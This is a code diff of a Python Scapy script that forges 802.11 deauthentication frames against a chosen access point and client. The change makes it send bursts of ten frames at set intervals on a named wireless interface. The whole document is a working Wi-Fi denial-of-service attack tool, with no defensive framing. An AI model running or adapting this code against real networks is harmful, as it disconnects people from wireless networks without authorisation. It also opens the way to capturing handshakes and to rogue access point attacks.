@@ -5,10 +5,10 @@ from APshandler import *
 import sys
 
 
-def deauth(iface,bssid,client):
+def deauth(interface,bssid,client):
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-   sendp(packet)
-   print('[Deauthenticating]: sent via: '+iface+' to BSSID: '+bssid+' for Client: '+client)
+   sendp(packet, iface=interface, inter=0.1, count=10) #10 packets/s
+   print('[Deauthenticating]: sent via: '+interface+' to BSSID: '+bssid+' for Client: '+client)
 
 if __name__ == "__main__":
    if len(sys.argv) !=5:
